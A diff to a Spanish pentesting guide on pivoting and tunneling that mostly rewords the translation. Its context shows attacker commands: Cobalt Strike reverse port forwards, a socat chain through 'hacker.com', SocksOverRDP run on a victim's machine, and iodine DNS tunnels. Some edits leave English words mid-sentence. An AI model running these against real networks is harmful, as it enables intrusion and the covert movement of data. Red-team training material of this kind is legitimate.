@@ -5,7 +5,7 @@
 ## Consejo de Nmap
 
 > [!WARNING]
-> **ICMP** y **SYN** scans no pueden ser tunelizados a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **scans TCP** (`-sT`) para que esto funcione.
+> **ICMP** y **SYN** los escaneos no se pueden tunelizar a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.
 
 ## **Bash**
 
@@ -145,22 +145,22 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host beacon**, no en el Team Server y el tráfico se envía al Team Server y desde allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host de beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Para tener en cuenta:
 
-- La reversa de puerto de Beacon está diseñada para **túnel de tráfico al Servidor de Equipo, no para retransmitir entre máquinas individuales**.
-- El tráfico está **tuneado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
-- **No se requieren privilegios de administrador** para crear reenvíos de puerto reversos en puertos altos.
+- La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
+- El tráfico está **tuneleado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
+- **No se requieren privilegios de administrador** para crear reenvíos de puerto reverso en puertos altos.
 
 ### rPort2Port local
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host de beacon**, no en el Servidor de Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor de Equipo) y desde allí al host:puerto indicado.
-```
+> En este caso, el **puerto se abre en el host de beacon**, no en el Servidor del Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor del Equipo) y desde allí al host:puerto indicado.
+```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
@@ -195,7 +195,7 @@ Necesitas usar la **misma versión para el cliente y el servidor**
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Utiliza la misma versión para el agente y el proxy**
+**Usa la misma versión para el agente y el proxy**
 
 ### Tunneling
 ```bash
@@ -290,9 +290,11 @@ Puedes eludir un **proxy no autenticado** ejecutando esta línea en lugar de la 
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-### SSL Socat Tunnel
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-**/bin/sh console**
+### Túnel SSL Socat
+
+**/bin/sh consola**
 
 Cree certificados en ambos lados: Cliente y Servidor
 ```bash
@@ -344,7 +346,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Necesitas tener **acceso RDP sobre el sistema**.\
 Descargar:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túnelizar paquetes sobre la conexión RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túnel de paquetes sobre la conexión RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
@@ -352,9 +354,9 @@ En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ahora podemos **conectar** a la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y escuchará en **127.0.0.1:1080**.
+Ahora podemos **connect** a la **victim** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **prompt** que dice que el **SocksOverRDP plugin is enabled**, y estará **listen** en **127.0.0.1:1080**.
 
-**Conéctate** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
+**Connect** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -403,7 +405,7 @@ Un proxy inverso creado por Microsoft. Puedes encontrarlo aquí: [https://github
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Se necesita root en ambos sistemas para crear adaptadores tun y túnel de datos entre ellos utilizando consultas DNS.
+Se necesita root en ambos sistemas para crear adaptadores tun y túneles de datos entre ellos utilizando consultas DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -478,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **es una herramienta para exponer soluciones a Internet en una línea de comando.**\
-_URI de exposición son como:_ **UID.ngrok.io**
+_La URI de exposición es como:_ **UID.ngrok.io**
 
 ### Instalación
 
